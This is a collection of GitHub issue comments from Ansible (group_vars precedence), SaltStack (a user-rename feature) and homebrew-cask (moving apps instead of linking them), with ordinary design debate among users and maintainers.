ansible/ansible/9065/314836106,"Going to plus one to question the ansible design here. In the real world, many different applications can run on the same host. Scoping group_vars at the host-level simply doesn't cover this use-case. Just as a thought experiment  Let's assume that the default behavior was modified so that running ansible-playbook with the ""-l"" option uses the group_vars child file (if it exists).  You could still handle the ""datacenter"" use-case that was mentioned through parent groups. All that would change is that the ""named"" child group for a host match would win the inheritence battle, instead of the ""last"" child group for a host match.  Making this small change would make hundreds of DevOps-y people happy, and would hurt nobody. ",,False,False,9065
ansible/ansible/9065/318955846,"From my previous comment, see  for a potential avenue to allow more pluggable behaviour here. ",,False,False,9065
ansible/ansible/9065/341348002,Can't believe that Ansible do not fix or reply on this issue.  It took me a few hours to debug. ,,False,False,9065
ansible/ansible/9065/341355139,"Can't believe that Ansible do not fix(give hints, warning) or reply more on this issue.  It took me a few hours to debug. ",,False,False,9065
ansible/ansible/9065/350467146,"I encountered this as well.  One approach was to use nested variables.  So take inventory group my_app_servers for example, and it lines up with the file my_app_servers.yml inside your group_vars, and you've got more than one application to manage on a common host.  I nested them like this Example my_app_servers.yml application_env   - application1   - application2  application_environments   application1      app1_port 8080     app1_conf_dir ""/somedirectory/conf""     app1_logs_dir ""/somedirectory/logs""     app1_app_install_name app1prd     application2       app2_port 8081      app2_conf_dir ""/somedirectory/conf""      app2_logs_dir ""/somedirectory/logs""      app2_app_install_name app2prd  In your main.yml, define a loop, and iterate over the nested variable list like this, with_items ""{{ application_env }}""   loop_control     loop_var application_env_item Then in your tasks, you can grab the nested variable that you want, to execute something. {{application_environments[application_env_item]['app1_app_install_name']}} (if you can pull one var out of that list, you can get the rest.). Hope that helps. ",,False,False,9065
ansible/ansible/9065/379246209,"This issue (#9065) was closed back in 2015. Same #6538. Same #6666. And many more.  Here is 2018, 4 years after many issues were open, and apparently it's more hot than it was at the beginning, and everyone lost hours due to a counter-intuitive design. This sounds like an alarm on the design. IMHO this needs to be reviewed and fixed. If everyone will continue use hacks and make ansible code ugly due to conditional var file includes, or inventories like ""[service1] host1 ansible_ssh_user=host1.com"", or additional libs to fix core functionality, ansible will be less attractive. IMHO these hacks don't seem aligned with the ansible's ""Simple IT Automation""  motto. @friend -&gt; What should be the trigger to have someone reevaluate PR #6666, or something similar that ""just works intuitively""? ",,False,False,9065
ansible/ansible/9065/379256290,I think group_vars themselves should be able to be prioritized.  Hiera for Puppet got it right.  You can specify how lookups are done based on facts or groups.  Let the end user be able to customize how group_vars should be processed and provide a mechanism to easily see the order in which Ansible is applying those variables. ,,False,False,9065
ansible/ansible/9065/383963162,"FYI, we dont normally see notifications on closed issues, responding here because someone pointed me at this, I'm also going to lock so people don't keep commenting in a forum maintainers won't see. @friend i think you want  and  configuration. @friend  open a proposal, but this is about a fundamental focus of each diff app. Ansible focuses on a task for a host, the other tools you mention focus on a much more complex structure. For ansible 'groups' are just a property of a host, not a principal entity,  the other tools focus on groups as 'the main context' and everything else is added onto that. I don't see either approach as 'wrong', just different. Trying to make Ansible work in such a way will break the simplicity paradigm, focus on A host and A task for what is just an organizational focus and transposing what i see as the 'accustomed way of thinking'  people bring from other tools. I would argue that this is just a perception on data organization and habits, but that is just my opinion. Feel free to submit a proposal, if you convince and gain enough traction with maintainers you might get the change you want, I just don't think it is a change we need. ",,False,False,9065
salt/saltstack/15511/41905806,"Please provide a function to rename OS users. In GNU/Linux this can be done by using . See  I think that OS X uses similar attitude. It should be possible to rename user in Windows either (I've done it using Control Panel). After adding this function,  state should not fail if user provides  that is already used by the user with different name, but rename the user. ",,False,False,15511
salt/saltstack/15511/54541579,"Seems very reasonable, thanks for the request. ",,False,False,15511
salt/saltstack/15511/54574783,"Looking into this.  Looks pretty straightforward, only question will be Windows.  Might need to consult with @friend ",,False,False,15511
salt/saltstack/15511/54584781,Only implemented functions to rename user.  Need to think about the changes to the state function.  Right now it attempts to run the respective add and if it fails reports back that the user add failed.  We could at that point attempt to rename the user but would need to know that it failed because of something like UID already existing. ,,False,False,15511
salt/saltstack/15511/54647159,"I'm actually not convinced that we should change the state.  I feel like we're assuming too much at that point -- if we accidentally put in a UID that already exists, it's going to rename the user?  That seems like asking for trouble.  If we want to add renaming to the state, we should hide it under a new argument. ",,False,False,15511
salt/saltstack/15511/54650144,"I was thinking about including an additional argument to the present function, rename or rename_on_fail or something, but you're right it opens up a whole can of worms for potential error cases.  Maybe just adding a new state function to rename users and make the error reporting on a failure in the present function better about reporting that the UID already exists for another user. ",,False,False,15511
salt/saltstack/15511/54660817,"I just feel like renaming users is one of those things that's just not designed to be idempotent.  I feel like if you need to do a user rename, you use remote execution () out of band of your states.  But maybe there's a case for allowing it within states. ",,False,False,15511
salt/saltstack/15511/54661299,"Not totally sold on the idea either.  The rename function is now in develop, we could let it sit and see if that meets the need, then revisit the second part of this request if the use case arises. ",,False,False,15511
salt/saltstack/15511/54662598,"Agreed.  I am going to close this as resolved for now, pending further discussion. ",,False,False,15511
salt/saltstack/15511/54662733,"Wait, wait! Use case I've prepared an image of openSUSE distribution for programmers of the company I'm working at. I've included default user named 'programmer'. But I want real username and hostname, based on this username. After the first load AutoYaST + my scripts ask username save it into grains ( requires user), makes appropriate hostname and , and starts salt. Salt renames user and manages files. I think shipping image without users at all and creating first user using salt would be inflexible, because I couldn't even load X11 if salt don't create user (due the lack of connection, for example). ",,False,False,15511
salt/saltstack/15511/54662956,Do you have to rename the user?  Couldn't you simply create the new user for the person who will be using the machine? ,,False,False,15511
salt/saltstack/15511/54663942,"Just after the answering to AutoYaST questions openSUSE loads with the  user. That means that the home directory is populated with files. I don't need this directory. Well, I can delete the user (and the home directory) via additional state, but I cannot do it while this user is running KDE. Also my state assumes that home folder of the real user is already in a correct state, but that's not true until I login to the KDE for the first time. Also KDE don't want to load if it finds some files under the  directory. That means that I need to reboot the machine manually anyway before my highstate. And one more thing some distributions (including openSUSE) disable auto login when there are multiple users in the system. I don't want that. You see, it's not so simple, as it appears on the first blush. ",,False,False,15511
salt/saltstack/15511/54665247,"So at that point I would lean towards using  with an  I still don't think it's something that necessarily belongs in the  state.  (I will also note I haven't actually looked at @friend's new rename code, so I'm sure the above example uses the wrong argument names) ",,False,False,15511
salt/saltstack/15511/54665445,Pretty close )  old = name and new = new_name. ,,False,False,15511
homebrew-cask/Homebrew/13201/100524296,"Changes to homebrew-cask installation behaviour Depending on how long you’ve been following the development of homebrew-cask (henceforth HBC), you might’ve come across this great rant&lt;sup&gt;1&lt;/sup&gt;. It was the turning point in making the  stanza (precursor to ) a requirement to every cask. Prior to that, HBC tried hard to be smart about what to link, but we eventually concluded being smart doesn’t work — there are too many edge cases. The end of linking, and the beginning of moving (reasoning) We reached another such point with linking. What works for CLI apps does not work for GUI apps, and by sticking close to the homebrew model we’re bending apps to do what they’re not expecting, and only suffering from it. Issues we cannot fix continue to pop up, and copy as merely a preference or something to be done occasionally can’t solve them. We cannot, in addition to the inconsistency with s being installed instead of linked, add yet one extra inconsistency where even s won’t have a predictable behaviour. To put it bluntly, linking sucks for GUI apps. It doesn’t work and will never not be broken, as we can’t control what other developers do. Linking isn’t even needed, if you think about it. What separation of concerns are we worried about? CLI tools should have the separation homebrew provides because some of their apps (like newer versions of OS-level tools) provide critical features that could break the entire system if overridden. That is not the case at all with GUI apps; the only apps we have that could break the system on install (s) are already given free range. If you use HBC, there’s not even any reason to install a GUI app any other way, so why would that separation matter? GUI apps aren’t the only suffering from the current behaviour, even. Other artifacts suffer from similar issues and some even required the introduction of a different kind of linking. In addition, while having different versions of the same CLI app is many times desirable, that is a far from the norm with GUI apps. Having an  that works on every app, even ones that auto-update, also becomes nonsensical. We should emulate regular usage (i.e. what people do without HBC), instead of trying to perpetuate a new paradigm that is basically contradicting expectations. This, however, does not mean losing customisation options when it makes sense (like ). Every workaround we build is forcing apps to fit our model, and our model is bad. We’re building workaround on top of workaround, adding more code and work for something that will never work correctly. From The Cathedral and the Bazaar “you often don't really understand the problem until after the first time you implement a solution. The second time, maybe you know enough to do it right. So if you want to get it right, be ready to start over at least once”. As with other changes in the past, we now understand this problem a bit better and will adjust our solution accordingly. The end of linking, and the beginning of moving (technical) First steps towards new behaviour  Every artifact stanza except  will move its target to the appropriate location, instead of being sym/hardlinked. s will be moved to  by default. will continue to work, but rename the artifact itself instead of a link. The Caskroom ( by default) still needs to exist. Versioned subdirectories of the Caskroom won’t exist anymore, though.  Explanations  Explained in the reasonings above why most artifacts will be moved instead of linked. As for binaries being the exception, it’s simple not only is it expected, it’s advantageous, recommended, and sometimes necessary. Many times a  is linked from inside an app bundle and cannot simply be moved/copied from there and continue to work. In these cases, symlinking is the recommended (by the developer) course of action anyway, so we stay in line with the idea of emulating regular usage. It also makes it work similarly to other CLI tools, like installs from homebrew. Self-explanatory. It’s what most users expect, and would be our default anyway. Self-explanatory. It will be needed to keep a few things The originals from , when they’re standalone. Other things like uninstall scripts that come with some s.   Explained in the reasonings above. #### New stanzas/keys/flags to enhance these changes . Similarly to , it should be used when a value of  is needed. It means “the artifact this cask uses auto-updates, so even if the cask file updates, leave this alone when upgrading others”. This does not mean  in general is no longer a desirable feature — it is, but for casks who do not do it themselves. . Example . It means the artifact needs to be in a certain location to function correctly and as such will be moved there even if you have a different default location. . Takes no arguments and forcibly overrides .  Pseudo-code for , considering an  Doesn’t this mean a bunch of stuff might break? In the short term, yes, it does, but it is the right decision. We understand we have a bunch of users that are using homebrew-cask daily, and ideally we could try to make this a smooth transition like in the past. However, we’re admittedly pre-alpha and setting transition strategies is an inglorious job (everything will be discarded in the end, after all) that puts on hold even the smallest of changes indefinitely. It is incredibly time consuming, has variable results (we still get a bunch of issues pertaining to it), and (above all) kills momentum. Furthermore, this is a big change and there’s really no good way to make this seamlessly. In the end, we want to continue to move forward and improve HBC. Being afraid of changes in a pre-alpha would mean stagnation. Are there any other big changes planned? There are ideas, yes, but no exact plans yet. Those ideas still need to be discussed and most are concerned with the creation and maintenance of casks, not the usage of HBC.  &lt;sup&gt;1&lt;/sup&gt; If you haven’t, I highly recommend it as piece of HBC’s history. ",,False,False,13201
homebrew-cask/Homebrew/13201/130349873,"Seems like a useful change, and might be timely as well - I plan to do a clean install with 10.11, so breaking changes are not a huge issue. So does the  stanza remove the need for explicit versioned urls, or is there still a preference for versioned, shasum'd formulas? Would an example of a formula where  then be an app like Spotify, as it manages its own updates (ie, any forumas that use  &amp; ) ",,False,False,13201
homebrew-cask/Homebrew/13201/130355914,"Well, depending on how long the implementation (and release) takes. For now, preference should be left with versioned urls. The overlap of apps that auto-update and apps that have unversioned urls isn’t clear ( will make it so), so this is a discussion for later. The security provided by always having a version is desirable. This is incorrect. A cask having an unversioned url (i.e. it almost exclusively will use ) is not guaranteed to auto-update, or vice-versa. The two are completely unrelated. ",,False,False,13201
homebrew-cask/Homebrew/13201/130356593,"Is there a milestone, task list, thread, or wiki page where people can go check how much of this has been implemented and/or released? ",,False,False,13201
homebrew-cask/Homebrew/13201/130357324,"Not currently. Things should be released as issues as time goes on. It might actually take a few weeks for development of this to start, but this is the type of thing that should be announce early. ",,False,False,13201
homebrew-cask/Homebrew/13201/130384234,"plus one  Everything sounds good to me, I'm glad to hear we are moving forward in this direction for the most part. If apps come in a folder with a bunch of other things (readmes, licenses, plugin directories, etc.) will those be moved to  as well? What about if they are required to be in the same directory as the application? Should  casks be maintained from version to version? If an application downloads the latest update when necessary, but does not install it for the user, should it be considered ? I know that Filezilla does something like this (or it used to, I haven't checked recently). ",,False,False,13201
homebrew-cask/Homebrew/13201/130387080,"No. See point 4 of The end of linking, and the beginning of moving (technical) in the top post. Only what we already link will be moved, it’s one to one. Than we use  to move the directory. We’re already covered, there, and some casks were already changed, even. Yes, so anyone installing it for the first time gets the latest version. Many (most?) of these have discoverable appcasts, though, which makes the job easier. No. Only the ones that can do it seamlessly should, because otherwise we can still provide a better experience. ",,False,False,13201
homebrew-cask/Homebrew/13201/130388886,"(The following is my own preference.) I don't like folders in the Applications folder unless it really is to organize a bunch of apps (Microsoft Office). Suggestions for apps like Audacity and Eclipse that have a required folder structure  Place folder contents in , and place an app symlink in  Place folder contents in , and place an app symlink in  (bc sometimes apps have the same name) Place folder contents in , and place an app symlink in , and  (probably not a good idea bc hidden files)  Suggestions for apps with non-code supporting files  Place supporting files in  (more consistent with the above) Place supporting files in , , , etc. (more consistent with Mac expectation that trashing the app will pretty much uninstall it) Discard supporting files Leave supporting files in Caskroom  ",,False,False,13201
homebrew-cask/Homebrew/13201/130390606,"I like those ideas, @friend. However, I’ll also say “definitely not for now”, and the first paragraph of the top post explains why. Those could introduce issues we’re not foreseeing, and this change is in part meant to fix things, not introduce new possible points of failure. It doesn’t mean we can’t revisit those in the future, naturally, but for now the takeaway from this post should be emulate regular usage. Let’s nail that first, and only then see if being smart can pay off. ",,False,False,13201
homebrew-cask/Homebrew/13201/130396370,"Okay. I'm assuming that means the following  For apps that require a folder structure, move the entire folder to  or leave it in the Caskroom For apps that provide a  with some documentation, discard the documentation or leave it in Caskroom  ",,False,False,13201
homebrew-cask/Homebrew/13201/130399973,"Move it, using . Leave it in the caskroom. Both those points were addressed in the previous post. ",,False,False,13201
homebrew-cask/Homebrew/13201/130508171,"You reference  , currently all of my casks have defaulted to  . Is this change also changing that behavior of utilizing a folder local to the user's home directory? (sorry if this was covered elsewhere) ",,False,False,13201
homebrew-cask/Homebrew/13201/130508809,"Yes, it is changing that behavior. You will still be able to use  if you want by using by using the  flag. ",,False,False,13201
homebrew-cask/Homebrew/13201/130526842,Was there an open discussion of the pro's and con's of this somewhere that I've missed? ,,False,False,13201
homebrew-cask/Homebrew/13201/130605724,"@friend It was all covered in the top post. @friend’s explanation is correct. @friend Yes, there were multiple, including #3083 and #3888. I have a slight feeling from your last comment and this one you might be under the impression this might be a matter of user preference and voting. It’s not. This is about fixing a broken model, and I’ve spent many months thinking about this solution and managing homebrew-cask always with that in mind, to understand how it’d affect it. Keeping the old system is unsustainable. Every time there’s a new problem our workarounds fail to address we have to discuss how to implement a new one. Those are becoming harder and harder, and many of them are impossible to solve without breaking experience. All of them are solved immediately by emulating regular usage. As mentioned in the top paragraph of the top post, being smart failed, and as mentioned in a previous post, let’s first get things to work, and think about being smart later. ",,False,False,13201
homebrew-cask/Homebrew/13201/130781732,plus one i want this for years ,,False,False,13201
homebrew-cask/Homebrew/13201/131088009,"After just quickly scanning plus one on the .  Right now I just don't install apps that I know do automatic updating assuming it would break things.  Also the moving of apps I can see as a much needed change as I've had issues with some apps being linked which result in me again not using cask but installing it the ""Old Fashioned Way"". This big changes can be annoying in the short term but it's good to figure these things out while the project is still relatively new than wait 10 years and have to deal with everything breaking ",,False,False,13201
homebrew-cask/Homebrew/13201/131682308,"The most important benefit of linking in my opinion was that the old versions did not need to be replaced in that workflow, and thus the user could easily downgrade back to a previous version simply by changing the link (or just use the previous version directly to check some previous functionality). The ability to downgrade to a previous state is one of the most important benefits of a package manager in my opinion. Applications that depend on being installed at a hardcoded path are exhibiting bad behavior. There doesn't seem to be too many of them listed at #12858, and we shouldn't need to change the whole structure just to accommodate these. If we want to support the use of the upgrading options provided by the applications themselves, then (lacking a copy-on-write filesystem) we could have application versioning disabled by default while having a configuration property to enable it. Another issue I discovered with the linking was that the dock seems to resolve symlinks and store the original source path, which forces me to update the items manually. I hope this issue can be fixed in some way, but if not then I can live with it. If there are some other major issues with linking, then please elaborate. As for the  stanza, I am fine with it in general for applications that auto-update by default, but please have an option for ignoring it for those who do not want auto-updates. When using a package manager I like to manage my updates, and I disabled auto-updating and update prompts for all applications before discovering the lack of an  command in Homebrew Cask. ",,False,False,13201
homebrew-cask/Homebrew/13201/131683817,"There are actually numerous issues stemming from linking.  Many apps will prompt the user, if not installed in a standard location, to move it there. Many apps support in-app upgrading, which will result in an inconsistent experience when used in conjunction with brew cask upgrade. Many apps are already not versioned (latest) Having multiple versions of the same app causes issues with launching the app, i.e., file associations and apps that open other apps. If the app is identified by id, it's not clear which version of the app should be launched, and the arbitrary choice can be confusing for the user. If the app is identified by path, that identifier will break when old versions are uninstalled. This is an issue with not only Dock but basically most other launcher apps too. If you want a backup of an older version of the app, you probably don't expect to use both at the same time. The proper way to do this is probably to backup the install media (dmg/zip) instead of keeping the live app around. This file already exists in /Library/Caches/Homebrew!  ",,False,False,13201
homebrew-cask/Homebrew/13201/131690443,"@friend There is a  method to handle this issue. If I install an application from Homebrew Cask, I don't expect to use the in-app updater. I have disabled all these updaters in my applications. However, if we actually want to support this behaviour, then I have suggested using an option to disable versioning. Perhaps we can extract the version information from these in some other way? Otherwise, I guess we're forced to drop versioning in these cases as per the current behaviour. I don't see this issue with my Calibre associations, which I upgraded a few days ago. Files associated with it open the latest version. Although upon opening the ""Open With"" submenu it does list multiple versions. Again, it would be nice if there was some way to have it only look within , but I can live with it. Good point. However, there isn't a simple way to have Homebrew Cask reinstall a previous version short of manually editing the cask file. Also, this is how Homebrew mainline itself is implemented, and it would be best to keep conformity with it as far as possible. ",,False,False,13201
homebrew-cask/Homebrew/13201/131690968,"I'm on mobile but there's a comment somewhere about how they tried to be smart about installing, but realized that was an unmaintainable amount of overhead, and that the most sensible way to install is in the same way a normal, non-cask user would. Also, having a way to extract/install old install media would be a great idea (but probably for later, unless you want to make it!). From what I glean, cask uses Homebrew because it's good infrastructure, not because the user experience should be the same. It's probably better to keep conformity with the non-cask app experience. ",,False,False,13201
homebrew-cask/Homebrew/13201/131699383,"In that case I would like to know about these issues. The only issue mentioned in the original post here was of the hardcoded location expectation from a few applications. If we introduce a generic downgrade feature, then users would probably expect it to be able to work across versions which weren't installed before as well, but that is problematic to implement in the Homebrew/Cask Git structure, where updates to version and installation instructions are not kept separate. I guess we could implement a ""revert"" feature that only reverts to versions already present in the cache, and reinstall it using the cask instructions at the revision at which it was originally installed. If this is actually implemented or planned for implementation, then I withdraw my objections to removing the linking structure. I am not familiar with Ruby programming, so I would probably not be able to implement this feature myself. The FAQ on this very issue suggests the opposite ",,False,False,13201
homebrew-cask/Homebrew/13201/131701959,"Also, this is a somewhat separate issue, but I always thought it strange that it seems like Homebrew Cask uses a hardcoded global path () to store the Casks regardless of the actual location of Homebrew itself, so even a local Homebrew installation would create global Casks (I haven't tested this myself, but this is my assumption lacking documentation to the contrary). It would probably have been best for it to use some location inside the Homebrew installation itself (unless explicitly configured otherwise), or at any rate not use a global location if Homebrew itself is not in one. The default value for the  option could probably also have been inferred from this. ",,False,False,13201
homebrew-cask/Homebrew/13201/131840282,"The reason we're moving away from linking and towards copying/moving instead is also due to an inherent difference in the nature of OS X apps and binary/CLI tools.  Within a Linux/Unix/BSD environment, it is commonplace to link binaries into  directories. Binaries are built against libraries, which reside in a preset location (, , etc.). App bundles are somewhat self-contained. Sometimes, they also contain config/preference data (although that is a bad idea, IMO)   It is not uncommon to use multiple versions of some CLI tools, especially if there are breaking/compatibility changes. A CLI tool will almost never update itself. There are a few newer ones, particularly package managers themselves, that can also update themselves (e.g. , ) - in fact, self-upgrading CLI tools often break things for Homebrew - a red flag that perhaps we shouldn't handle app bundles, many of which have some sort of update functionaly or contain persist data within the bundle, the same way Homebrew handles CLI tools. Different versions of CLI tools will often be named differently from other versions, especially when managed by Homebrew (e.g.  vs ). Some app bundles also follow this type of a scheme, in terms of adopting a new name with a new major release.    Some apps will throw dialogs to move to , like you said, but there are some that will simply refuse to run. This could get very messy. It's why Homebrew dropped the feature ( has been deprecated in favor of ). I think it wouldn't be as big of an issue with casks, simply because building software is a more fragile process than downloading/installing app bundles. Nevertheless, it's still a headache to implement at this point, and if we ever add it, it would be much later in the roadmap for this project. In the past, we've tried to keep with consistent user experience with Homebrew. However, we've found that it simply doesn't work as well as we want to, because OS X apps just can't be handled the same way as CLI binaries. Imagine using an apple peeler to peel an orange - it doesn't get the job done (unless you wanted orange zest in the first place). Thus, we're willing to compromise a bit on UX conformity with Homebrew in order to make the system more functional and less buggy overall. This has yet to be updated. ",,False,False,13201
homebrew-cask/Homebrew/13201/131932850,"@friend I’m on a phone (won’t have access to a computer for the next week), so forgive any bluntness. @friend and @friend addressed your points, but I’d like to add something quick. As I’ve mentioned in the top post, we’re not like other package managers. Any point you justify with “I expect that of other package managers” is irrelevant we tried those, and they failed. Following a pattern that breaks for us simply because others do so is nonsensical. Furthermore, all your solutions are nothing more than more workarounds, which is exactly the problem, as mentioned in the top post, so they don’t solve anything. Lastly, you link to an issue that has few examples, and ask for more cases. I want to be perfectly clear that I see you were perfectly cordial when making your case and I appreciate that and want to be just as polite when I say your points are mostly due to lack of context and experience with HBC. Those few examples are part of a list still being made, and part of a much larger issue. We’re also not going to link to every specific issue that lead to every specific reasoning — the top post is verbose as it is. I’ll say again this is not a vote. We tried other solutions before, and this new course was decided after years of dealing with HBC and seeig what works and doesn’t. Discussion is encouraged and appreciated, and we will give context for the reasonings, but if you want specific examples, those would take a while to search for just to get them to you simply to justify in detail what we already know and explained in broad strokes. That would be very time consuming and frankly useless, so if you want specifics, you’ll have to do the searching. I hope you understand we can’t be doing that for every user, or we’d do nothing else. We will explain reasonings and link to the appropriate contexts, but if conclusions have been reached through experience with many separate issues throughout the years, you can’t reasonably expect any of us to drop everything and do your reasearch to satisfy your doubts, when you just got here, and every issue is public and searchable. We’re trying to make the project better, and this decision is just one more towards that goal. It’s a conclusion arrived at from being here everyday seeing things break and work, and striving for less of the former and more of the latter. ",,False,False,13201
homebrew-cask/Homebrew/13201/132082986,"@friend Thanks for explaining the structural differences between OS X GUI apps and CLI tools. You describe three differences  Binaries are built against libraries, while app bundles are self-contained. Sometimes, app bundles store configuration data inside themselves. App bundles provide self-updating functionalities.  The first difference does not seem to be relevant to versioning. As you mention, keeping configuration data inside app bundles seems to be a bad practice, and would get overwritten by Homebrew Cask upgrades in the new schema as well. The self-updating issue seems to be the relevant issue here. These don't seem to be problematic for the most part, but they do mess up the versioning. As I have mentioned before, we can have versioning as an optional feature for those who don't want to use the application updaters. ",,False,False,13201
homebrew-cask/Homebrew/13201/132083014,"@friend I acknowledge that I am not aware of the full context. I merely noted that there didn't seem to be too many examples compiled of the main issue that you noted in your original post. If you assert that there are a significant number of applications that break if not located at a hardcoded path, then I'll take your word for it. I think that when making such a large structural change, the reasoning for it should be documented as comprehensively as possible. You may have had lots of isolated discussions on this issue at various points, but there is some point to bringing these together (not necessarily in this issue) so that everyone (not just the maintainers and people associated with the project from the start) can see the full context. There might be alternative solutions or enhancements provided as a result of a comprehensive discussion on this. I did look through some old issues on this subject that were linked from the discussion on the upgrade feature before commenting here, but you yourself took the opposite stance on those. I can try looking further, but I can never be sure that my research is comprehensive without some official compilation to cross-reference. I didn't present any solution yet, other than keeping the status quo as an option. PS Sorry to disturb your vacation wink Please feel free to not respond until you return. ",,False,False,13201
homebrew-cask/Homebrew/13201/132153026,"Here’s the thing there were discussions. This issue is discussed and settled. If we restart the discussion everytime someone who wasn’t there asks to have the conversation again, we’ll never do anything. That is a good sign, I hope, I did really think hard about this. Thank you. Going well so far. A good day to you. ",,False,False,13201
homebrew-cask/Homebrew/13201/132212793,"But it is! This often means that app bundles are built against old or outdated libraries, where as the dependencies of CLI tools can be updated without having to update the actual tool itself. App bundles also sometimes stick their stuff in weird places while CLI tools are pretty standard with their behavior - I've found that some non-native apps are the worst offenders, placing items in random folders that I would never think to check. It's not so much an issue with versioning directly, but rather unnecessary overhead if a maintainer has to keep up with all of the files in order to stage the upgrade process via , especially some of these apps offer somewhat reliable systems for upgrading themselves. You're right about that. Perhaps some sort of app bundle ""snapshots"" could assist in identifying config/persistent data within the bundles take snapshot of bundle right after install, and take snapshot of bundle right before upgrade, and then perform the upgrade and re-apply the changes from between the snapshots. I have no idea how effective that would be, nor how much code we would have to write. Regardless of how you look at it, this project has been practically stagnant for the past few months up to now in terms of core development, and the original direction we were moving in was simply a huge ball of workarounds that somehow worked. But it has become pretty clear that the approach we've used in the past isn't ""cost-effective"" to maintainers, nor is it the best for end-users either. There were too many corner cases to accomodate for, and so rewriting the core to handle corner case apps more elegantly is a priority right now. I'm sorry I couldn't find any more old issues that are relevant to this discussion, as you've asked for, but here's one last megalist of everything that's been referred to in this issue so far, for your reference - I imagine they might have gotten lost in the shuffle. They cover the default installation process, default installation location, etc. - many decisions/discussions that are the basis of the decision in the recent changes. There's a lot of back and forth discussion on pretty much every decision that has had been made in the past, so you may find that somebody else can explain the rationale for a decision much better than I can.  #12746  #12076 #3888 #8210 #9178 #12517 #10115 #4651 #4359 #13230 #13256  #10039  ",,False,False,13201
homebrew-cask/Homebrew/13201/133156163,"I wholeheartedly welcome this change. From a user's perspective I've had to deal with explicit or subtle breakage due to linking on multiple occasions, and I have a personal installer script that swaps some applications into  (browsers, Tunnelblick, etc.). I add to the script every time I'm bitten, and the script is growing. Not fun. @friend Please don't just talk from your experience. ""I don't have problems so you shouldn't make changes"" isn't a good attitude. I apologize for exaggerating; I know you were asking about what exactly the problems are. However, if you allow me to talk from my experience, I'll tell you that problems abound. And I'm not even a maintainer, who oversees all the headaches. Please excuse me, but I think this sentence along sets you apart from normal users. I call that paranoid. Homebrew doesn't even support upgrade at the moment (and not any time soon, as far as I know), I just can't picture how you do your upgrades. At any rate, you're not the norm, unless I'm completely carried away by my own workflows. ",,False,False,13201
homebrew-cask/Homebrew/13201/133156170,"I would like to add to the thread by pointing out that not only some app bundles need to live in a certain location in order to work. There are other nonstandard artifacts, like Mail plugins, that won't work if linked; and as OS X tightens up its security across releases, we should expect to see more of those (or maybe the hackish things would stop working altogether, who knows). Example the QuoteFix Mail plugin. Last time I fixed it I had to use an ugly  + copy in  hack to make it work. Should we also have an issue (similar to #12858) to track those nonstandard casks that should benefit greatly from plans in this issue? ",,False,False,13201
homebrew-cask/Homebrew/13201/133163640,@friend would you mind sharing your script that describes some of the workarounds needed for non working linked apps ? I'm currently refactoring my provisioning setup to use homebrew casks but I'm not sure that was a good idea with what I'm reading here... ,,False,False,13201
homebrew-cask/Homebrew/13201/133164278,"What I currently use  It doesn't solve every problem though, just things I would do on a clean install. And it would break uninstalling to some extent, but hopefully you wouldn't need to uninstall those critical apps. ",,False,False,13201
homebrew-cask/Homebrew/13201/133187547,"Comment in the issue instead, and I’ll add to and adapt the main post when I have the chance. ",,False,False,13201
homebrew-cask/Homebrew/13201/135755465,"so, for us that already have N applications installed through cask, how will the upgrade and relocation happen? Will Cask automatically move the apps there after some  in the future? Will i have to remove all and reinstall for it to automatically happen? will there be any command to make this happen? Also, for those of us with  already on their shell profile, will this conflict in any way with the new mode?  should i remove it ? ",,False,False,13201
homebrew-cask/Homebrew/13201/135757333,"@friend All those questions are answered in the top post. There will be no automatic transition for the new system, and there will be no conflict by having that line in your shell profile. ",,False,False,13201
homebrew-cask/Homebrew/13201/138109474,"hi all, just learning about this great project today would it may be wise to wait for this update to be done ? or doesn't it really matter ? ",,False,False,13201
homebrew-cask/Homebrew/13201/138109554,"@friend We have no time-frame set for completion, so it’s really up to you. ",,False,False,13201
homebrew-cask/Homebrew/13201/141668345,"This change to moving apps is fantastic news. I avoided using casks because I never liked the linking behavior and inconsistency of having a mix of apps and links in my /Applications. And superficially because I hated seeing icons in Applications with the symlink symbol ). Can't wait for this change, will start using casks as soon as it happens. Thanks! ",,False,False,13201
homebrew-cask/Homebrew/13201/142046062,"I have concerns with the behavior of . As the owner of my machine, I should have final say in where applications are installed; not the formula author. There is clearly potential conflict between  and . As the pseudo-code above does, it is helpful to print a warning when those values are in conflict. However, final say ought to be determined by the machine owner, not the author of the formulas (who may be errant, if well-intentioned). I would propose that if  conflicts with , a warning message still be emitted as suggested here. But  should be the respected value, not . The user then becomes responsible for any issues with installation. The following scenarios are possible  formula indicates  but does not, in fact, actually need to be in said location (be it benign ignorance or accidental configuration, or anything really) formula indicates  but app actually functions just fine in a specific  (known by the user) formula indicates  for certain uses of the app, but user does not need said uses, and app works fine for given subset of uses from  formula indicates  but user is attempting to determine if app actually functions in  anyway  ",,False,False,13201
homebrew-cask/Homebrew/13201/142047896,"@friend I think  should be respected over  by default, but we could provide a  flag that overrides this decision. I envision lots of bug reports about faulty installations otherwise. ",,False,False,13201
homebrew-cask/Homebrew/13201/142048877,"I can definitely see that. The biggest thing, I think, is that users should have final say somehow. If that's with Yet Another Flag™, so be it. As long as it's possible for the user to override the formula author, I'm happy. ",,False,False,13201
homebrew-cask/Homebrew/13201/142142620,Added  to the top post. ,,False,False,13201
homebrew-cask/Homebrew/13201/142326558,"I'm curious, what would happen if I was to submit an application that is called ""Mail"" or ""Pages"", etc. would brew-cask overwrite the existing App? How does it decide whether an App is pre-existing or not? Does it even do that or do you completely rely on peer-review? ",,False,False,13201
homebrew-cask/Homebrew/13201/142327183,"The logic course of action there is to not overwrite what already exists, and print an error. ",,False,False,13201
homebrew-cask/Homebrew/13201/142333700,then how do upgrades work? At some point you have to overwrite an existing path ,,False,False,13201
homebrew-cask/Homebrew/13201/142342686,"To upgrade, you must install first. This is why they are different verbs. When you install, it can be assumed nothing with the same name exists — if it does, we know something is wrong, and should abort. However, when you upgrade, if something exists with the same name it is expected, and we can proceed. Furthermore, we should always  and never , so none of these are irreversible. ",,False,False,13201
homebrew-cask/Homebrew/13201/142351840,"Well, I think there should be an option to remove the trashed files after a successful upgrade. Many of us have good back up policies, and we'll be clearing out the trashes anyway. In my opinion homebrew-cask should automate things as much as possible. ",,False,False,13201
homebrew-cask/Homebrew/13201/142353345,"I’d wager most don’t. What’s the problem then? No harm done. The difference there is you’re the one cleaning out the trash, not us. It should. Above that, however, it shouldn’t screw up your setup. In all, a few MBs for an updated app in the trash is way better than the hassle of losing an important app or having to go get your backup. Also, if I recall correctly, this is what apps that auto-update themselves do, so that even goes in line with the new concept of emulating regular usage. ",,False,False,13201
homebrew-cask/Homebrew/13201/142360629,Yes it is. Okay it makes sense. ,,False,False,13201
